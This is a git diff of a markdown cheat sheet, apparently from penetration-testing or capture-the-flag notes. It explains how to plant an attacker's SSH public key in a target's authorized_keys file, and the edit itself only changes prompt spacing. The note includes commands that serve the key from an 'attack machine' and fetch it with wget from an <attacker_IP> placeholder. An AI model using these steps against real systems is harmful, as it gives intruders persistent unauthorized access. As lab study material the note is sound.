@@ -21,10 +21,10 @@ Next, copy the content of the id_rsa.pub file and put it inside the authorized_k
 *NOTE: if there isn't an authorized_keys file in /.ssh you'll need to make one*
 ```
 (on target machine)
-/.ssh$ touch authorized_keys
+/.ssh $ touch authorized_keys
 # creates the file
 
-/.ssh$ chmod 600 authorized_keys
+/.ssh $ chmod 600 authorized_keys
 # changes permissions for the user to read/write to file
 
 NOTE: to get your file to target system set up python server on attack machine and use wget from target machine
@@ -34,13 +34,13 @@ $ python3 -m http.server <port>
 # sets up server on your machine for target machine to grab files
 
 (on target machine)
-/.ssh$ wget http://<attacker_IP>:<port>/path/to/public/key
+/.ssh $ wget http://<attacker_IP>:<port>/path/to/public/key
 # grabs id_rsa_pub file
 
-/.ssh$ cat id_rsa_pub
+/.ssh $ cat id_rsa_pub
 # displays the contents to be copied (can remove file afterwards)
  
-/.ssh$ nano authorized_keys
+/.ssh $ nano authorized_keys
 # opens the file with nano to be edited // paste contents from the pub file here
 ```
 
